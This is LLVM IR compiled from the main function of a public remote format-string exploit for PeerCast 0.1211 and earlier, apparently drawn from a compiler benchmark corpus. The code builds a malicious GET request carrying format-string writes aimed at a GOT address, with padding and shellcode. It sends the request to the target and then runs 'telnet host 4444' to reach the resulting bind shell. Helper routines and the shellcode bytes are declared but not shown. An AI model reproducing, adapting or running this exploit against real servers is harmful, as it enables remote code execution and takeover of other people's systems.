; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1055.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1055.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [63 x i8] c"*^*^*^ PeerCast <= 0.1211 remote format string exploit ^*^*^*\0A\00", align 1
@.str.2 = private unnamed_addr constant [63 x i8] c"*^*^*^                    by Darkeagle                 ^*^*^*\0A\00", align 1
@.str.3 = private unnamed_addr constant [64 x i8] c"*^*^*^      uKt researcherz [ http://unl0ck.org ]      ^*^*^*\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@HOST = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@GOTADDR = common dso_local global i64 0, align 8
@SHELLADDR = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [24 x i8] c"[*] Buildin' evil code\0A\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"GET /html/en/index.html\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [7 x i8] c"\0D\0A\0D\0A\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"[+] Buildin' complete!\0A\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"telnet %s 4444\00", align 1
@.str.10 = private unnamed_addr constant [16 x i8] c"[*] Connectin'\0A\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"[-] Connection failed!\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [16 x i8] c"[+] Connected!\0A\00", align 1
@.str.13 = private unnamed_addr constant [14 x i8] c"[*] Sleepin'\0A\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"[*] Sendin'\0A\00", align 1
@.str.15 = private unnamed_addr constant [29 x i8] c"[*] Connectin' in da shell\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca [31337 x i8], align 16
  %10 = alloca [31337 x i8], align 16
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.2, i64 0, i64 0))
  %22 = call i32 @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.3, i64 0, i64 0))
  %23 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %24 = call i32 @memset(i8* %23, i32 0, i32 31337)
  %25 = getelementptr inbounds [31337 x i8], [31337 x i8]* %10, i64 0, i64 0
  %26 = call i32 @memset(i8* %25, i32 0, i32 31337)
  %27 = load i32, i32* @AF_INET, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %27, i32* %28, align 4
  %29 = load i32, i32* @PORT, align 4
  %30 = call i32 @htons(i32 %29)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %30, i32* %31, align 4
  %32 = load i8*, i8** @HOST, align 8
  %33 = call i32 @inet_addr(i8* %32)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 0
  store i32 %33, i32* %35, align 4
  %36 = load i32, i32* @AF_INET, align 4
  %37 = load i32, i32* @SOCK_STREAM, align 4
  %38 = load i32, i32* @IPPROTO_IP, align 4
  %39 = call i32 @socket(i32 %36, i32 %37, i32 %38)
  store i32 %39, i32* %7, align 4
  %40 = load i64, i64* @GOTADDR, align 8
  store i64 %40, i64* %11, align 8
  %41 = load i64, i64* @SHELLADDR, align 8
  store i64 %41, i64* %12, align 8
  store i32 1265, i32* %13, align 4
  %42 = load i8, i8* %15, align 1
  %43 = load i8, i8* %16, align 1
  %44 = load i8, i8* %17, align 1
  %45 = load i8, i8* %18, align 1
  %46 = load i64, i64* %11, align 8
  %47 = call i32 @doit(i8 zeroext %42, i8 zeroext %43, i8 zeroext %44, i8 zeroext %45, i64 %46)
  store i32 4, i32* %14, align 4
  %48 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %49 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %50 = call i32 @strcat(i8* %49, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %51 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %52 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %53 = call i32 @strlen(i8* %52)
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %51, i64 %54
  %56 = load i8, i8* %18, align 1
  %57 = load i8, i8* %17, align 1
  %58 = load i8, i8* %16, align 1
  %59 = load i8, i8* %15, align 1
  %60 = load i8, i8* %18, align 1
  %61 = zext i8 %60 to i32
  %62 = add nsw i32 %61, 1
  %63 = trunc i32 %62 to i8
  %64 = load i8, i8* %17, align 1
  %65 = load i8, i8* %16, align 1
  %66 = load i8, i8* %15, align 1
  %67 = load i8, i8* %18, align 1
  %68 = zext i8 %67 to i32
  %69 = add nsw i32 %68, 2
  %70 = trunc i32 %69 to i8
  %71 = load i8, i8* %17, align 1
  %72 = load i8, i8* %16, align 1
  %73 = load i8, i8* %15, align 1
  %74 = load i8, i8* %18, align 1
  %75 = zext i8 %74 to i32
  %76 = add nsw i32 %75, 3
  %77 = trunc i32 %76 to i8
  %78 = load i8, i8* %17, align 1
  %79 = load i8, i8* %16, align 1
  %80 = load i8, i8* %15, align 1
  %81 = call i32 @snprintf(i8* %55, i32 31337, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i8 zeroext %56, i8 zeroext %57, i8 zeroext %58, i8 zeroext %59, i8 zeroext %63, i8 zeroext %64, i8 zeroext %65, i8 zeroext %66, i8 zeroext %70, i8 zeroext %71, i8 zeroext %72, i8 zeroext %73, i8 zeroext %77, i8 zeroext %78, i8 zeroext %79, i8 zeroext %80)
  %82 = load i64, i64* %12, align 8
  %83 = load i32, i32* %13, align 4
  %84 = load i32, i32* %14, align 4
  %85 = call i8* @evil_builder(i64 %82, i32 %83, i32 %84, i32 16)
  store i8* %85, i8** %8, align 8
  %86 = load i8*, i8** %8, align 8
  %87 = load i8*, i8** %8, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = call i32 @memset(i8* %90, i32 85, i32 32)
  %92 = load i8*, i8** %8, align 8
  %93 = load i8*, i8** @shellcode, align 8
  %94 = call i32 @strcat(i8* %92, i8* %93)
  %95 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %96 = load i8*, i8** %8, align 8
  %97 = call i32 @strcat(i8* %95, i8* %96)
  %98 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %99 = call i32 @strcat(i8* %98, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %100 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %101 = getelementptr inbounds [31337 x i8], [31337 x i8]* %10, i64 0, i64 0
  %102 = load i8*, i8** @HOST, align 8
  %103 = call i32 @sprintf(i8* %101, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i8* %102)
  %104 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  %105 = load i32, i32* %7, align 4
  %106 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %107 = call i64 @connect(i32 %105, %struct.sockaddr* %106, i32 12)
  %108 = icmp ne i64 %107, 0
  br i1 %108, label %109, label %112

109:                                              ; preds = %2
  %110 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0))
  %111 = call i32 @exit(i32 0) #3
  unreachable

112:                                              ; preds = %2
  %113 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.12, i64 0, i64 0))
  %114 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  %115 = call i32 @sleep(i32 1)
  %116 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i64 0, i64 0))
  %117 = load i32, i32* %7, align 4
  %118 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %119 = getelementptr inbounds [31337 x i8], [31337 x i8]* %9, i64 0, i64 0
  %120 = call i32 @strlen(i8* %119)
  %121 = call i32 @send(i32 %117, i8* %118, i32 %120, i32 0)
  %122 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  %123 = call i32 @sleep(i32 1)
  %124 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.15, i64 0, i64 0))
  %125 = call i32 @sleep(i32 1)
  %126 = getelementptr inbounds [31337 x i8], [31337 x i8]* %10, i64 0, i64 0
  %127 = call i32 @system(i8* %126)
  ret i32 0
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @doit(i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i64) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i8* @evil_builder(i64, i32, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
